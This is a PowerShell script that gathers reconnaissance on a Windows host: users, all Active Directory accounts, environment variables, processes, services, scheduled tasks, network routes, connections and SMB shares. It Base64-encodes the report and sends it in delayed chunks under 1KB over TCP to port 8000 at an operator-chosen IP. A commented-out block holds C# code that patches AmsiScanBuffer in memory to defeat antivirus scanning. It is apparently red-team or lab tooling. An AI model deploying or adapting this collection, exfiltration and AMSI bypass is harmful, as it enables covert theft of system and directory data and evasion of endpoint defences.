<##################################################################################################################

.Synopsis - This script calls various cmdlets to read specific information within a system. After this
information is logged, it is then encoded in Base64, and then sent over TCP in segments under 1kb
to a specified IP as a string.

##################################################################################################################>

<##################################################################################################################



#################################################################################################################

$data = @"
using System;
using System.Runtime.InteropServices;
using System.Threading;
public class Program
{
	[DllImport("kernel32")]
	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
	[DllImport("kernel32")]
	public static extern IntPtr LoadLibrary(string name);
	[DllImport("kernel32")]
	public static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);
	public static void Run()
	{
		IntPtr lib = LoadLibrary("a"+"m"+"si."+"dll");
		IntPtr amsi = GetProcAddress(lib, "Am"+"s"+"iScan"+"B"+"uffer");
		IntPtr final = IntPtr.Add(amsi, 0x95);
		uint old = 0;
		VirtualProtect(final, (UInt32)0x1, 0x40, out old);
		Console.WriteLine(old);
		byte[] patch = new byte[] { 0x75 };
		Marshal.Copy(patch, 0, final, 1);
		VirtualProtect(final, (UInt32)0x1, old, out old);
	}
}
"@

Add-Type $data -Language CSharp 

[Program]::Run()
#>

<##################################################################################################################

.Function Calls

##################################################################################################################>


$validateIpaddr = $false
while($validateIpaddr -eq $false){
    try{
        $ipaddr = Read-Host("What is the IP address the results will be sent to (Formerly 192.168.10.40)`n")
        $null = [ipaddress]$ipaddr
        Write-Host("`nAttempting to ping $ipaddr")
        $testingIp = Test-Connection $ipaddr -count 1 -ErrorAction SilentlyContinue
        #if(($testingIp -ne " ") -or ($testingIp -ne $null)){
        if($testingIp -ne $null){
            Write-Host("`nPinged successfully, Destination reachable.")
            $validateIpaddr = $true
        }
        else {
            Write-Host("`ncould not ping")
        }
    }
    catch {
        "$ipaddr is not a valid IP"
    }
}

$sleepTest=$false
while($sleepTest -eq $false){
    try{
        $sleepCount = Read-Host("How long should packets be delayed? (in seconds)`n")
        $null = [float]$sleepCount
        #if(($testingIp -ne " ") -or ($testingIp -ne $null)){
        if($sleepCount -ne $null){
            $sleepTest = $true
        }
        else {
            Write-Host("`nInvalid delay length")
        }
    }
    catch {
        "Invalid delay length"
    }
}

Function EncodeStringAndSend {
    param (
        [Parameter(Mandatory=$true, Position=0)] [String] $reportName,
        [Parameter(Mandatory=$true)] [String] $ip,
        [Parameter(Mandatory=$true)] [String] $port
    )
$bytes = [System.Text.Encoding]::Unicode.GetBytes($reportName)
$EncodedMessage = [Convert]::ToBase64String($bytes)

$size = 1000
$chunks = for ($i = 0; $i -lt $EncodedMessage.Length; $i += $size) { 
    $EncodedMessage.Substring($i, [Math]::Min($size, $EncodedMessage.Length - $i)) 
}
#$firstElement = $chunks[0]
#Write-Host("`n$firstElement")
$chunkIndex = 0
#Write-Host("$bytes")
$EncodedMessage | Measure-Object -Character
$client = New-Object System.Net.Sockets.TcpClient($ip, $port)
#$sleepCount = Read-Host("How long should packets be delayed? (in seconds)`n")
while($chunkIndex -ne $chunks.length){
    $stream = $client.GetStream()
    Write-Host("Sending chunk number $chunkIndex")
    $progress = ($chunkIndex / $chunks.length) * 100

    Write-Progress -Activity "Sending bytes" -Status "working " -PercentComplete $progress
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.Write($chunks[$chunkIndex])
    $writer.Flush()
    $chunkIndex++
    sleep($sleepCount)
}

$client.Close()
Write-Host($timer.Elapsed)
Write-Host($timer.Stop)
}


##################################################################################################################

#Walks through each command that query different parts of a system

##################################################################################################################

$timer = [Diagnostics.Stopwatch]::StartNew()
$discoveries = New-Object System.Collections.Generic.List[System.Object]
$header = New-Object System.Collections.Generic.List[System.Object]
try{
    $report = "---Begin---`n"
    
    #Date retrieval
    try{
        $header.Add("---Get Date---`n")
        $CurrentDate = Get-Date -Format r | ft -AutoSize -Wrap  | Out-String  
        $discoveries.Add("$currentDate")
    }
    catch{
        $discoveries.Add("`nFailed to find data")
    }

    #hostname
    try{
        $header.Add("---Host Name---")
        $CurrentHostName = [System.Net.DNS]::GetHostByName($null) | ft -AutoSize -Wrap  | Out-String  
        $discoveries.Add("$currentHostName")
    }
    catch{
        $discoveries.Add("`nFailed to find data")
    }

    #Collecting Current user info
    try{
        $header.Add("---Getting Current User---")
        $CurrentUser = [Security.Principal.WindowsIdentity]::GetCurrent() | ft -AutoSize -Wrap  | Out-String  
        $discoveries.Add("$CurrentUser")
    }
    catch{
        $discoveries.Add("`nFailed to find data")
    }

    #collect AD User information
    try{
        $header.Add("---Getting ADUser---") 
        $CurrentADUser = Get-ADUser -Filter * | ft -AutoSize -Wrap  | Out-String  
        $discoveries.Add("$currentADUser")
    }
    catch{
        $discoveries.Add("`nFailed to find data")
    }

    #Find PSSessions
    try{
        $header.Add("`n`n---Get Active PSSessions---") 
        $CurrentPSSession = Get-PSSession -ComputerName "localhost" | ft -AutoSize -Wrap  | Out-String  
        $discoveries.Add("$CurrentPSSession")
    }
    catch{
        $discoveries.Add("`nFailed to find data")
    }

    #Retrieve environment variables
    try{
        $header.Add("`n`n---Get environment variables---") 
        $CurrentChildItem = Get-ChildItem env: | ft -AutoSize -Wrap  | Out-String  
        $discoveries.Add("$CurrentChildItem")
    }
    catch{
        $discoveries.Add("`nFailed to find data")
    }
    #Get computer info
    try{
        $header.Add("`n`n---Get Hardware Abstraction---")
        $CurrentComputerInfo = Get-ComputerInfo | select WindowsProductName, WindowsVersion, OSHardwareAbstractionLayer | ft -AutoSize -Wrap  | Out-String    
        $discoveries.Add("$CurrentComputerInfo")
    }
    catch{
        $discoveries.Add("`nFailed to find data")
    }

    #Get computer info 2
    try{
        $header.Add("`n`n---Get OS versions---") 
        $CurrentComputerInfoFull = Get-ComputerInfo | ft -AutoSize -Wrap  | Out-String  
        $discoveries.Add("$CurrentComputerInfoFull")
    }
    catch{
        $discoveries.Add("`nFailed to find data")
    }

    #Get Process
    try{
        $header.Add("`n`n---Get Processes---") 
        $CurrentProcess = Get-Process | ft -AutoSize -Wrap | ft -AutoSize -Wrap  | Out-String  
        $discoveries.Add("$CurrentProcess ")
    }
    catch{
        $discoveries.Add("`nFailed to find data")
    }

    #Get Service
    try{
        $header.Add("`n`n---Get Services---") 
        $CurrentService = Get-Service | ft -AutoSize -Wrap | ft -AutoSize -Wrap  | Out-String  
        #$CurrentService = Gt-rvice | ft -AutoSize -Wrap | ft -AutoSize -Wrap  | Out-String  

        $discoveries.Add("$CurrentService")
    }
    catch{
        $discoveries.Add("`nFailed to find data")
    }

    #Get Scheduled tasks and info
    try{
        $header.Add("`n`n---Scheduled Tasks---") 
        $CurrentScheduledTask = Get-ScheduledTask | Get-ScheduledTaskInfo | ft -AutoSize -Wrap  | Out-String  
        $discoveries.Add("$CurrentScheduledTask")
    }
    catch{
        $discoveries.Add("`nFailed to find data")
    }

    #Grabbing Net IP address
    try{
        $header.Add("`n`n---IP Address---") 
        $CurrentNetIPAddress = Get-NetIPAddress | ft -AutoSize -Wrap  | Out-String
        $discoveries.Add("$CurrentNetIPAddress")
    }
    catch{
    $discoveries.Add("`nFailed to find data")
    }

    #Grabbing IP Config
    try{
        $header.Add("`n`n---IP Config---")
        $CurrentNetIPConfiguration = Get-NetIPConfiguration | ft -AutoSize -Wrap  | Out-String  
        $discoveries.Add("$CurrentNetIPConfiguration")
    }
    catch{
        $discoveries.Add("`nFailed to find data")
    }

    #Grabbing Net IP address
    try{
        $header.Add("`n`n---Arp Cache---")
        $CurrentNetNeighbor = Get-NetNeighbor | ft -AutoSize -Wrap  | Out-String  
        $discoveries.Add("$CurrentNetNeighbor")
    }
    catch{
        $discoveries.Add("`nFailed to find data")
    }

    #Grabbing Net IP address
    try{
        $header.Add("`n`n---Routing table---")
        $CurrentNetRoute = Get-NetRoute | Format-List -Property * | ft -AutoSize -Wrap  | Out-String  
        $discoveries.Add("$CurrentNetRoute")
    }
    catch{
        $discoveries.Add("`nFailed to find data")
    }

    #TCP connections
    try{
        $header.Add("`n`n---TCP Connection---")
        $CurrentNetTCPConnection = Get-NetTCPConnection | select Local*, Remote*, State, @{n="ProcessName";e={(Get-Process -Id $_.OwningProcess).ProcessName}},@{n="ProcessPath";e={(Get-Process -Id $_.OwningProcess.Path)}} | ft -AutoSize -Wrap  | Out-String  
        $discoveries.Add("$CurrentNetTCPConnection")
    }
    catch{
        $discoveries.Add("`nFailed to find data")
    }

    #Network Shares
    try{
        $header.Add("`n`n---SMB Shares---")
        $CurrentSmbMapping = Get-SmbMapping | ft -AutoSize -Wrap  | Out-String  
        $discoveries.Add("$CurrentSmbMapping")
    }
    catch{
        $discoveries.Add("`nFailed to find data")
    }
    
##################################################################################################################

#Cycles through each command that is querried and then writes this information to a file.

##################################################################################################################

    #outfiling each command into a text document for analysis
    #Declaring variables
    $bytelength = 0
    $iterateHeader = 0
    foreach ($discovery in $discoveries) {
        $report += $header[$iterateHeader]

        if($discovery.Length -lt 1) {
            $report += "`nNo Infomation Available"
            }
        Else{
            $report += $discovery
            $bytelength += $discovery.Length
            }
        #iteration of header
        $report += "`n"
        $iterateHeader++
    }
    Write-Host("`n`nWriting a total of ") -NoNewline
    Write-Host($bytelength) -ForegroundColor Green  -NoNewline
    Write-Host(" characters.") 
}
catch {
    Write-Host("Error creating string.")
}
Write-Host($timer.Elapsed)
sleep(2)


##################################################################################################################

#Function calls to send an encoded string.

##################################################################################################################


#try {
    EncodeStringAndSend -reportName "$report" -ip "$ipaddr" -port "8000"
#}
#catch{
  #  Write-Host("`nFailed to send file")
#}


##################################################################################################################

#End / Debug below

##################################################################################################################